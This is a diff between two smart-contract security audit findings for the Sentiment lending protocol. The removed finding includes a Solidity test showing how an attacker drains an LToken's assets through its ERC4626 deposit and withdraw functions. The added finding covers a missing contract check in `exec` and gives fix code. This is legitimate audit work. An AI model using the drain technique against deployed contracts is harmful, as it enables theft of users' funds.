@@ -1,65 +1,86 @@
-Ruhum
-# Attacker can steal LToken's underlying asset
+0xSmartContract
+# `exec` function should check if the `target` is a contract
 
-## Summary
-The attacker can abuse the inherited ERC4626 contract to steal the LToken's underlying asset.
+##  ```exec``` function should check if the ```target``` is a contract
 
-## Vulnerability Detail
-The attacker deposits assets through the ERC4626 interface to receive shares. Normal operations of the LToken contract don't involve the ERC4626 native shares. None are minted when users borrow or repay tokens. Thus, under normal circumstances, the attacker is the only one who has shares. Since they control 100% of the shares, they can redeem these shares to withdraw all the underlying assets.
+**Context:**
+[Account.sol#L154](https://github.com/sherlock-audit/2022-08-sentiment-0xSmartContract/blob/main/protocol/src/core/Account.sol#L154)
 
-Here's a test showcasing the issue:
+**Description:**
+```exec``` function not payable so we believe it's not the desired behavior to call a non-contract address and consider it a successful call.
 
-```sol
-// protocol/src/test/tokens/LToken.t.sol
-
-    function testAttack() public {
-        // normal lending stuff copied from another test:
-        erc20.mint(address(lErc20), 100e18);
-
-        cheats.prank(address(accountManager));
-        // 1e18 tokens are lent to "account"
-        lErc20.lendTo(account, 1e18);
-
-        uint borrowBalance = lErc20.getBorrowBalance(account);
-        // Assert
-        assertEq(borrowBalance, 1e18);
-
-        // attacker deposits into the LToken contract so they get ERC4626 shares
-        // so first give the attacker some liqudidity, e.g. 1e18
-        address attacker = cheats.addr(10);
-        erc20.mint(attacker, 1e18);
-        cheats.prank(attacker);
-        erc20.approve(address(lErc20), 1e18);
-        cheats.prank(attacker);
-        lErc20.deposit(1e18, attacker);
+For example, if a certain business logic requires a successful token.transferFrom() call to be made with the Account.sol, if the token is not a existing contract, the call will return success: true instead of success: false and break the caller's assumption and potentially malfunction features or even cause fund loss to users.
 
 
-        // at this point, there's 100e18 tokens inside the LToken contract.
-        // 1e18 tokens are lent to "account".
-        // Because the attacker is the only one who has ERC4626 shares he can redeem them to
-        // withdraw all the assets inside the contract
-        assertEq(erc20.balanceOf(attacker), 0);
-
-        cheats.prank(attacker);
-        lErc20.withdraw(100e18, attacker, attacker);
-
-        assertEq(erc20.balanceOf(attacker), 100e18);
+```js
+function exec(address target, uint amt, bytes calldata data)
+        external
+        accountManagerOnly
+        returns (bool, bytes memory)
+    {
+        (bool success, bytes memory retData) = target.call{value: amt}(data);
+        return (success, retData);
     }
 ```
 
-## Impact
-All the underlying assets of LToken contracts can be stolen.
+**Proof of Concept**
+The qBridge exploit (January 2022) was caused by a similar issue.
+https://halborn.com/explained-the-qubit-hack-january-2022/
 
-## Code Snippet
-No shares are minted when a user borrows or repays tokens: https://github.com/sentimentxyz/protocol/blob/4e45871e4540df0f189f6c89deb8d34f24930120/src/tokens/LToken.sol#L128-L165
 
-User can freely call the native ERC4626 functions: https://github.com/sentimentxyz/protocol/blob/4e45871e4540df0f189f6c89deb8d34f24930120/src/tokens/utils/ERC4626.sol#L48-L117
 
-## Tool used
 
-Manual Review
+**Recommendation:**
 
-## Recommendation
-The ERC4626 integration here is weird. You don't use any of its functions. Instead, you built something different around it. For example, instead of issuing the ERC4626 shares, you create your own internal accounting of custom shares: https://github.com/sentimentxyz/protocol/blob/4e45871e4540df0f189f6c89deb8d34f24930120/src/tokens/LToken.sol#L137-L140
+As a reference, OpenZeppelin's Address.functionCall() will check and require(isContract(target), "Address: call to non-contract");
 
-I don't see the benefit of using ERC4626 in this case. Either remove it or use the native functions.
+```js
+
+ function isContract(address account) internal view returns (bool) {
+        // This method relies on extcodesize/address.code.length, which returns 0
+        // for contracts in construction, since the code is only stored at the end
+        // of the constructor execution.
+
+        return account.code.length > 0;
+    }
+
+
+
+ function functionCallWithValue(
+        address target,
+        bytes memory data,
+        uint256 value,
+        string memory errorMessage
+    ) internal returns (bytes memory) {
+        require(address(this).balance >= value, "Address: insufficient balance for call");
+        require(isContract(target), "Address: call to non-contract");
+
+        (bool success, bytes memory returndata) = target.call{value: value}(data);
+        return verifyCallResult(success, returndata, errorMessage);
+    }
+
+
+
+```
+Consider adding a check and throw when the target is not a contract.
+
+
+```exec``` function  works correctly as in the line below:
+
+```js
+import "@openzeppelin/contracts/utils/Address.sol";
+
+    using Address for address;
+
+ function exec(address target, uint amt, bytes calldata data)
+        external
+        accountManagerOnly
+        returns (bool, bytes memory)
+    {
+        require(target.isContract(), "Account: target is not a contract");
+        (bool success, bytes memory retData) = target.call{value: amt}(data);
+        return (success, retData);
+    }
+
+
+```
